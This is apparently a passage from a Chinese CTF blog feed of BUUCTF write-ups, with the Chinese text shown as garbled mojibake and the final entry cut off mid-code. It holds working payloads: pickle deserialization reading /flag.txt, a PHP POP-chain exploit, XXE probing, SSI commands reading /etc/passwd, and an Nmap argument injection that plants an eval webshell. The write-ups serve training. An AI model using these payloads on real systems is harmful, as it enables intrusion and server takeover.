a</code></pre></code></pre><p>python2ä¸‹æ‰§è¡Œâ€”<code>cposix%0Alistdir%0Ap0%0A%28S%27/%27%0Ap1%0Atp2%0ARp3%0A.</code><br>ç‚¹å‡»<code>ä¸€é”®æˆä¸ºå¤§ä¼šå‘˜</code>,æŠ“åŒ…æ”¹<code>become</code>â€”-å‘åŒ…<br><img src="https://ftp.bmp.ovh/imgs/2021/03/cde243001d7f40fe.png"><br>çœ‹åˆ°<code>flag.txt</code><br>returnä¸­æ”¹ä¸º<code>eval,(&quot;open(&#39;/flag.txt&#39;,&#39;r&#39;).read()&quot;)</code>æ‰“å¼€<code>flag.txt</code>â€”â€”-&gt;<code>c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.</code><br><img src="https://ftp.bmp.ovh/imgs/2021/03/cdfd506f0aac1b38.png"><br>ä½†ç”¨<code>os.system,(&#39;cat /flag.txt&#39;,)</code>ä¸è¡Œï¼Ÿï¼Ÿï¼Ÿ     </p><h2 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><ol><li><a href="https://www.cnblogs.com/cjsblog/p/9277677.html"><code>JWT</code></a> </li><li><a href="https://www.anquanke.com/post/id/188981">pythonååºåˆ—åŒ–</a></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜</title>
    <link href="/2021/03/16/BUU054/"/>
    <url>/2021/03/16/BUU054/</url>
    
    <content type="html"><![CDATA[<h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><p>[MRCTF2020]Ezpop       </p><ul><li>PHPååºåˆ—åŒ–       </li><li>ä»£ç å®¡è®¡      </li></ul><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><pre><code><pre><code class="hljs php">Welcome to index.php<span class="hljs-meta">&lt;?php</span><span class="hljs-comment">//flag is in flag.php</span><span class="hljs-comment">//WTF IS THIS?</span><span class="hljs-comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><span class="hljs-comment">//And Crack It!</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;    <span class="hljs-keyword">protected</span>  $var;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params">$value</span>)</span>&#123;        <span class="hljs-keyword">include</span>($value);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;append(<span class="hljs-keyword">$this</span>-&gt;var);    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;    <span class="hljs-keyword">public</span> $source;    <span class="hljs-keyword">public</span> $str;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$file=<span class="hljs-string">&#x27;index.php&#x27;</span></span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;source = $file;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Welcome to &#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;source.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;str-&gt;source;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;source)) &#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;            <span class="hljs-keyword">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;        &#125;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;    <span class="hljs-keyword">public</span> $p;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params">$key</span>)</span>&#123;        $function = <span class="hljs-keyword">$this</span>-&gt;p;        <span class="hljs-keyword">return</span> $function();    &#125;&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;pop&#x27;</span>]))&#123;    @unserialize($_GET[<span class="hljs-string">&#x27;pop&#x27;</span>]);&#125;<span class="hljs-keyword">else</span>&#123;    $a=<span class="hljs-keyword">new</span> Show;    highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;</code></pre></code></pre><p>ä¸‰ä¸ªç±»<code>Modifierã€Showã€Test</code><br>ä¸‰ä¸ªé­”æ³•å‡½æ•°<code>__invokeã€__toStringã€__get</code>      </p><ol><li><code>__invoke</code>:å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œè¯¥æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨;æ¯”å¦‚æœ¬é¢˜Testç±»ä¸­çš„<code>$function()</code>å°†$functionç­‰äºä¸€ä¸ªå®ä¾‹åŒ–çš„ç±»å³å¯è°ƒç”¨è¯¥å‡½æ•°ã€‚          </li><li><code>__toString</code>:æœ¬é¢˜ä¸­<code>preg_match</code>å¯è°ƒç”¨æ”¹å‡½æ•°        </li><li><code>__get</code>: ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®â€“privateæˆ–æ²¡æœ‰åˆå§‹åŒ–çš„å±æ€§ï¼›æœ¬é¢˜ä¸­å¯ä»¥ä»¥æ­¤è°ƒç”¨modifierä¸­çš„$var.     </li></ol><p>å°†showä¸­çš„str=å®ä¾‹åŒ–çš„Test<br>Testä¸­çš„pç­‰äºmodifierä¸­çš„var<br>ç”¨varåˆ©ç”¨ä¼ªåè®®è¯»å–<code>flag.php</code>       </p><h2 id="è§£"><a href="#è§£" class="headerlink" title="è§£"></a>è§£</h2><p>payloadï¼š</p><pre><code>```php&lt;?phpclass Modifier&#123;        //public $code = 12313;    protected $var = &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;; &#125;class Show&#123;    public $source;    public $str;    public function __construct($file)    &#123;        $this-&gt;source = $file;    &#125;&#125;class Test&#123;    public $p;    public function __construct()    ##ç”¨äºå®ä¾‹åŒ–å¯¹è±¡    &#123;        $this-&gt;p=new Modifier();    &#125;&#125;$a=new Show(&#39;aa&#39;);$a-&gt;str=new Test();//$a-&gt;str-&gt;p=new Modifier();$c=new show($a);$b=urlencode(serialize($c));echo $b;?&gt;``</code></pre><p>ç»“æœï¼š      </p><pre><code>O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Bs%3A2%3A%22aa%22%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D       </code></pre><p>è¾“å‡ºbase64è§£ç å³å¯</p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜</title>
    <link href="/2021/03/15/BUU053/"/>
    <url>/2021/03/15/BUU053/</url>
    
    <content type="html"><![CDATA[<h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><p>[NCTF2019]True XML cookbook<br><img src="https://ftp.bmp.ovh/imgs/2021/03/f8a90def8d4a5fab.png">      </p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>ä¹‹å‰ä¹Ÿåšè¿‡ä¸€é“è¿™æ ·çš„xml<br>æŠ“åŒ…<br>ç›´æ¥ç”¨ä¹‹å‰çš„payloadæ‰“ä¸€ä¸‹      </p><p><img src="https://ftp.bmp.ovh/imgs/2021/03/5d56a3bc80996d6c.png"><br>å¯ä»¥<br>æ ¹ç›®å½•æ‰¾ä¸€ä¸‹flagâ€”â€“&gt;æ²¡æœ‰<br>çœ‹WPè¿™é“é¢˜è¦æ‰“å†…ç½‘çš„<br>hostsé‡Œä¼¼ä¹æ²¡å•¥<br>çœ‹<code>/proc/net/arp</code><br>è¿™ä¸ªæ–‡ä»¶ä¹Ÿæœ‰IPåœ°å€<br><img src="https://ftp.bmp.ovh/imgs/2021/03/2b8962c67f37597b.png"><br>ä½†ç›´æ¥<code>http://10.0.93.2</code>ä¼šæŠ¥é”™<br>è¿˜è¦å¯¹Dæ®µçˆ†ç ´ä¸€ä¸‹    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/03/7219c14ed0259e73.png">     </p><p><del>ä¸ç†è§£ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</del><br>è¿™ä¸ªIPåªæ˜¯æœ¬æœºçš„IPï¼Œè¿˜è¦æ‰¾åˆ°å­˜æ´»çš„IP      </p><h2 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><ol><li>XML<ol><li>ç”¨äºä¼ è¾“å’Œå­˜å‚¨æ•°æ®</li></ol></li><li><code>&lt;!ENTITY æ–‡ä»¶å  SYSTEM &quot;urlæˆ–åè®®&quot;&gt;</code>é€ æˆæ–‡ä»¶è¯»å–ï¼Œcsrfç­‰  </li></ol><pre><code>     &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;      ##XMLå£°æ˜    &lt;!DOCTYPE a[          ##a--&gt;æ–‡ä»¶å      &lt;!ENTITY admin SYSTEM &quot;http://10.0.93.11&quot;&gt;     ##admin---&gt;å®ä½“å      ]&gt;    &lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;          ##&amp;admin;---&gt;å®ä½“è°ƒç”¨&#123;ä¸€ä¸ªå®ä½“ç”±ä¸‰éƒ¨åˆ†æ„æˆ: ä¸€ä¸ªå’Œå· (&amp;), ä¸€ä¸ªå®ä½“åç§°, ä»¥åŠä¸€ä¸ªåˆ†å· (;)&#125;          </code></pre><p>XMLå¤–éƒ¨å®ä½“<code>admin</code>è¢«èµ‹å€¼ä¸ºï¼š<code>http://10.0.93.11</code>,åœ¨è§£æXMLæ—¶ï¼Œå®ä½“<code>admin</code>çš„å€¼ä¼šè¢«æ›¿æ¢ä¸º<code>http://10.0.93.11</code>çš„å†…å®¹å€¼ï¼Œå…³é”®å­—<code>SYSTEM</code>ä¼šå‘Šè¯‰XMLè§£æå™¨ï¼Œ<code>admin</code>å®ä½“çš„å€¼å°†ä»å…¶åçš„URLä¸­è¯»å–ï¼Œå¹¶æŠŠè¯»å–çš„å†…å®¹æ›¿æ¢<code>admin</code>å‡ºç°çš„åœ°æ–¹ã€‚<br>XMLæ”¯æŒçš„åè®®ï¼š<br><img src="https://ftp.bmp.ovh/imgs/2021/03/e8ca3a5eafb7b626.gif">       </p><p>ENTITY å®ä½“ï¼Œåœ¨ä¸€ä¸ªç”šè‡³å¤šä¸ªXMLæ–‡æ¡£ä¸­é¢‘ç¹ä½¿ç”¨æŸä¸€æ¡æ•°æ®ï¼Œæˆ‘ä»¬å¯ä»¥é¢„å…ˆå®šä¹‰ä¸€ä¸ªè¿™æ¡æ•°æ®çš„â€œåˆ«åâ€ï¼Œå³ä¸€ä¸ªENTITYï¼Œç„¶ååœ¨è¿™äº›æ–‡æ¡£ä¸­éœ€è¦è¯¥æ•°æ®çš„åœ°æ–¹è°ƒç”¨å®ƒã€‚        </p><p><a href="https://www.cnblogs.com/backlion/p/9302528.html">MORE</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜</title>
    <link href="/2021/03/14/BUU052/"/>
    <url>/2021/03/14/BUU052/</url>
    
    <content type="html"><![CDATA[<h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><p>[BJDCTF2020]EasySearch<br><img src="https://ftp.bmp.ovh/imgs/2021/03/f23cc01a377b7e84.png">     </p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>sqlæ³¨å…¥äº†ä¸€æ³¢ï¼Œæ„Ÿè§‰ä¸è¡Œ<br>çœ‹WPè¯´æ˜¯<code>index.php.swp</code>æ³„éœ²    </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>ob_start();<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_hash</span>(<span class="hljs-params"></span>)</span>&#123;$chars = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;$random = $chars[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].$chars[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].$chars[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].$chars[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].$chars[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)];<span class="hljs-comment">//Random 5 times</span>$content = uniqid().$random;<span class="hljs-keyword">return</span> sha1($content); &#125;    header(<span class="hljs-string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);***    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;username&#x27;</span>]) <span class="hljs-keyword">and</span> $_POST[<span class="hljs-string">&#x27;username&#x27;</span>] != <span class="hljs-string">&#x27;&#x27;</span> )    &#123;        $admin = <span class="hljs-string">&#x27;6d0bc1&#x27;</span>;        <span class="hljs-keyword">if</span> ( $admin == substr(md5($_POST[<span class="hljs-string">&#x27;password&#x27;</span>]),<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)) &#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;            $file_shtml = <span class="hljs-string">&quot;public/&quot;</span>.get_hash().<span class="hljs-string">&quot;.shtml&quot;</span>;            $shtml = fopen($file_shtml, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable to open file!&quot;</span>);            $text = <span class="hljs-string">&#x27;</span><span class="hljs-string">            ***</span><span class="hljs-string">            ***</span><span class="hljs-string">            &lt;h1&gt;Hello,&#x27;</span>.$_POST[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&#x27;&lt;/h1&gt;</span><span class="hljs-string">            ***</span><span class="hljs-string">***&#x27;</span>;            fwrite($shtml,$text);            fclose($shtml);            ***<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[!] Header  error ...&quot;</span>;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;                &#125;<span class="hljs-keyword">else</span>    &#123;***    &#125;***<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>åªè¦<code>substr(md5($_POST[&#39;password&#39;]),0,6))==6d0bc1</code>å³å¯ç™»å½•æˆåŠŸ<br>ç”¨å¾ç¥çš„è„šæœ¬è·‘ä¸‹     </p><pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<span class="hljs-keyword">import</span> random<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encryption</span>(<span class="hljs-params">chars</span>):</span>    <span class="hljs-keyword">return</span> hashlib.md5(chars.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)).hexdigest()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">generate</span>():</span>  code = <span class="hljs-string">&quot;&quot;</span>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):    add_num = <span class="hljs-built_in">str</span>(random.randrange(<span class="hljs-number">0</span>,<span class="hljs-number">9</span>))<span class="hljs-comment">#çº¯æ•°å­—</span>    add_al = <span class="hljs-built_in">chr</span>(random.randrange(<span class="hljs-number">65</span>,<span class="hljs-number">91</span>))<span class="hljs-comment">#çº¯å¤§å†™å­—æ¯</span>    add_str = <span class="hljs-built_in">str</span>(random.randrange(<span class="hljs-number">0</span>,<span class="hljs-number">9</span>)) + <span class="hljs-built_in">chr</span>    (random.randrange(<span class="hljs-number">65</span>,<span class="hljs-number">91</span>))<span class="hljs-comment">#æ•°å­—å’Œå­—æ¯</span>    sj = random.choice([add_str])    code = <span class="hljs-string">&quot;&quot;</span>.join([sj,code])  <span class="hljs-keyword">return</span> code<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span>     start = <span class="hljs-string">&quot;6d0bc1&quot;</span> <span class="hljs-comment">#æŒ‡å®šå‰å…­ä½</span>     <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        strs = generate()        <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;Test %s &quot;</span> % strs)        <span class="hljs-keyword">if</span> encryption(strs).startswith(start):            <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;yes!&quot;</span>)            <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;[+] %s &quot;</span> % strs + <span class="hljs-string">&quot;%s &quot;</span> % encryption(strs))            <span class="hljs-keyword">break</span>        <span class="hljs-keyword">else</span>:            <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;no!&quot;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    main()    <span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;å®Œæˆï¼&#x27;</span>)</code></pre></code></pre><p>ä¼ å…¥<code>username=123   password=8A6K7P4S6B</code><br><img src="https://ftp.bmp.ovh/imgs/2021/03/9f2cf23aebee616d.png"><br><code>.shtml</code>  ???<br>çœ‹ä¸€ä¸‹<br><img src="https://ftp.bmp.ovh/imgs/2021/03/89e291278ef0a050.png">      </p><p><a href="https://blog.csdn.net/qq_40657585/article/details/84260844"><code>SSIæ³¨å…¥æ¼æ´</code> </a>    </p><h2 id="è§£"><a href="#è§£" class="headerlink" title="è§£"></a>è§£</h2><p>flagåœ¨åŸç›®å½•çš„ä¸Šçº§<br>payloadï¼š<code>&lt;!--#exec cmd=&quot;ls ../&quot;--&gt;</code>    </p><h2 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><p><code>SSIæ¼æ´</code>       </p><ol><li><code>Server-Side Includes Injection</code>æœåŠ¡å™¨åŒ…å«æ³¨å…¥ï¼Œç”¨äºåŠ¨æ€é¡µé¢çš„æŒ‡ä»¤ã€‚SSIå°±æ˜¯åœ¨HTMLæ–‡ä»¶ä¸­ï¼Œå¯ä»¥é€šè¿‡æ³¨é‡Šè¡Œè°ƒç”¨çš„å‘½ä»¤æˆ–æŒ‡é’ˆï¼Œä»è€Œé€ æˆçš„æ³¨å…¥è„šæœ¬æˆ–ä»»æ„ä»£ç æ‰§è¡Œ        </li><li>æ³¨å…¥æ¡ä»¶ï¼šWebæœåŠ¡å™¨å¼€å¯ï¼›æœªå¯¹ç›¸å…³å…³é”®å­—è¿‡æ»¤ï¼›é¡µé¢ä¸­æœ‰ç”¨æˆ·çš„è¾“å…¥        </li><li>payloadï¼š<code>&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;</code><a href="https://blog.csdn.net/qq_40657585/article/details/84260844">MORE</a></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜</title>
    <link href="/2021/03/13/BUU051/"/>
    <url>/2021/03/13/BUU051/</url>
    
    <content type="html"><![CDATA[<h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><p>[NPUCTF2020]ReadlezPHP<br><img src="https://ftp.bmp.ovh/imgs/2021/03/574f24b54f71d30b.png">  </p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>F12å‘ç°æºç         </p><p><img src="https://ftp.bmp.ovh/imgs/2021/03/d42dac4b31df6db8.png"><br>ååºåˆ—åŒ–<br>æœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„ï¼Œå¦‚æœæœ‰sourceâ€”â€”-&gt;<code>die(0)</code><br>æ‰€ä»¥ä¼ å‚è¦æŠŠå‰é¢çš„sourceåˆ æ‰       </p><h2 id="è§£"><a href="#è§£" class="headerlink" title="è§£"></a>è§£</h2><ol><li><code>assert</code>â€”-&gt;æ£€æŸ¥ä¸€ä¸ªæ–­è¨€æ˜¯å¦ä¸º FALSEï¼Œå¦‚æœæ‹¬å·ä¸­æ˜¯å­—ç¬¦ä¸²ï¼Œä¼šå°†å…¶æŒ‰ä»£ç æ‰§è¡Œ         </li><li><code>call_user_func</code>â€”â€”&gt;æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°è°ƒç”¨       </li></ol><p>flagåœ¨phpinfoä¸­<br>payloadï¼š     </p><pre><code>```php&lt;?phpcalss HelloPhp&#123;    public $a=&quot;phpinfo&quot;;    public $b=&quot;call_user_func&quot;;&#125;$test=new HelloPhp();echo urlencode(serialize($test));?&gt;//ç»“æœO:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:7:&quot;phpinfo&quot;;s:1:&quot;b&quot;;s:14:&quot;call_user_func&quot;;&#125;   ```        </code></pre><p>æˆ‘çœ‹æœ‰äº›å¸ˆå‚…çš„WPåºåˆ—åŒ–ä¹‹å‰urlencodeäº†ä¸€ä¸‹ï¼Œè¿™é‡Œä¸åŠ ä¹Ÿå¯       </p><p>ä½†æˆ‘æƒ³åˆ°ä¹‹å‰åšè¿‡çš„ä¸€é“ACTFçš„é¢˜ï¼Œä¹Ÿæ˜¯<code>$b($a)</code>çš„å½¢å¼ï¼Œé‚£é“é¢˜å°±å¿…é¡»è¦urlencodeï¼Œæ‰€ä»¥ä¿é™©èµ·è§ï¼Œè¿˜æ˜¯åŠ ä¸Šå§     </p><p>assertå’Œevalçš„åŒºåˆ«ï¼š      </p><ul><li>assertæŠŠæ•´ä¸ªå­—ç¬¦ä¸²å‚æ•°å½“PHPä»£ç æ‰§è¡Œï¼ŒevalæŠŠåˆæ³•çš„PHPä»£ç æ‰§è¡Œ       </li><li><a href="https://blog.csdn.net/ojingzhiyuan12/article/details/88556074">MORE</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜</title>
    <link href="/2021/03/11/BUU050/"/>
    <url>/2021/03/11/BUU050/</url>
    
    <content type="html"><![CDATA[<h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><p>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap<br><img src="https://ftp.bmp.ovh/imgs/2021/03/c3d85e1949d6f0a2.png">    </p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>è¿™é“é¢˜å’Œä¹‹å‰åšè¿‡çš„ä¸€é“é¢˜å·®ä¸å¤š<code>[BUUCTF 2018]Online Tool</code><br>ä¸è¿‡è¿™é“é¢˜è¿‡æ»¤äº†PHP<br>è®°ä¸€ä¸‹ä½¿ç”¨çŸ­æ ‡ç­¾ç»•è¿‡    </p><h2 id="è§£"><a href="#è§£" class="headerlink" title="è§£"></a>è§£</h2><p>payloadï¼š<code>127.0.0.1&#39; &lt;?= @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.phtml &#39;</code>        </p><p>å…¶ä»–è§£æ³•        </p><p>payloadï¼š<code>127.0.0.1&#39; -iL ../../../../flag -o 1 &#39;</code><br><img src="https://ftp.bmp.ovh/imgs/2021/03/3668a6d8791e96c0.png">     </p><p><code>-iL</code>æ‰«ææ–‡ä»¶<br><code>-o</code>å°†æ‰«æåˆ°çš„å†…å®¹è¯»å…¥æ–‡ä»¶</p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜</title>
    <link href="/2021/03/10/BUU049/"/>
    <url>/2021/03/10/BUU049/</url>
    
    <content type="html"><![CDATA[<h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><p>[WUSTCTF2020]æœ´å®æ— å<br><img src="https://ftp.bmp.ovh/imgs/2021/03/273a5c946a150017.png">      </p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>æ²¡å•¥ä¸œè¥¿ï¼Œçœ‹çœ‹<code>robots.txt</code>         </p><pre><code>User-agent: *Disallow: /fAke_f1agggg.php     </code></pre><p>è®¿é—®<br><img src="https://ftp.bmp.ovh/imgs/2021/03/3f6fe65b4f82f8c7.png"><br>è®¿é—®åå‡ºç°æºç       </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>header(<span class="hljs-string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);error_reporting(<span class="hljs-number">0</span>);highlight_file(<span class="hljs-keyword">__file__</span>);<span class="hljs-comment">//level 1</span><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;    $num = $_GET[<span class="hljs-string">&#x27;num&#x27;</span>];    <span class="hljs-keyword">if</span>(intval($num) &lt; <span class="hljs-number">2020</span> &amp;&amp; intval($num + <span class="hljs-number">1</span>) &gt; <span class="hljs-number">2021</span>)&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹æˆ‘çš„åŠ³åŠ›å£«, ä¸æ˜¯æƒ³çœ‹æ—¶é—´, åªæ˜¯æƒ³ä¸ç»æ„é—´, è®©ä½ çŸ¥é“æˆ‘è¿‡å¾—æ¯”ä½ å¥½.&lt;/br&gt;&quot;</span>;    &#125;<span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;é‡‘é’±è§£å†³ä¸äº†ç©·äººçš„æœ¬è´¨é—®é¢˜&quot;</span>);    &#125;&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å»éæ´²å§&quot;</span>);&#125;<span class="hljs-comment">//level 2</span><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;md5&#x27;</span>]))&#123;   $md5=$_GET[<span class="hljs-string">&#x27;md5&#x27;</span>];   <span class="hljs-keyword">if</span> ($md5==md5($md5))       <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æƒ³åˆ°è¿™ä¸ªCTFeræ‹¿åˆ°flagå, æ„Ÿæ¿€æ¶•é›¶, è·‘å»ä¸œæ¾œå²¸, æ‰¾ä¸€å®¶é¤å…, æŠŠå¨å¸ˆè½°å‡ºå», è‡ªå·±ç‚’ä¸¤ä¸ªæ‹¿æ‰‹å°èœ, å€’ä¸€æ¯æ•£è£…ç™½é…’, è‡´å¯Œæœ‰é“, åˆ«å­¦å°æš´.&lt;/br&gt;&quot;</span>;   <span class="hljs-keyword">else</span>       <span class="hljs-keyword">die</span>(<span 